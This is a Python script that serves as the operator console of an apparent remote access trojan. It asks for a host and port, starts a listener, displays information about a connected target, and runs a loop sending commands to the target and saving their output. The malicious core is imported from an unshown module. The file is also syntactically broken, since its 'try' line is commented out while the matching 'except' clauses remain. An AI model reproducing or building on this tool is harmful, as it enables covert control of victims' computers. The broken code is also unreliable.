#!/usr/bin/python3

import os, sys
try:
    from termcolor import cprint
    import colorama
except ImportError:
    confirm = input("[-] ERROR: Install termcolor and colorama packages [YES/no]?")
    if confirm.lower() in ["yes", "y"]:
        os.system("pip install termcolor")
        os.system("pip install colorama")
        print("\n[!] Run this script again.")
    else:
        print("OKi doki, bYe!")
    sys.exit(0)

from core import PyCMD


def main():
    colorama.init()
    host, port = "", ""
    while not host or not port:
        host = input(" ---> Enter the host server: ")
        port = input(" ---> Port: ")
    
    rat = PyCMD(host, port)
    rat.run_server()
    rat.waiting()
    rat.show_info_target()
    cprint(" ** The command help is '?'", "yellow")
    while True:
        #try:
        rat.output = "success"
        rat.prompt()
        exit = rat.run_command() #Verifying that the server has not been disconnected, return 1
        if exit:
            break
        if rat.output != "success": # output --> returns "success", if the command returns nothing
            output = rat.show_output()
            rat.save_output(output) #save each command output
            cprint(output, "green")
            except ValueError as err:
            	cprint("[-] ERROR: the command format is wrong.\n", "white", "on_red")
            except Exception as e:
            	cprint(f"[-] ERROR: {e}\n", "white", "on_red")


if __name__ == "__main__":
    main()
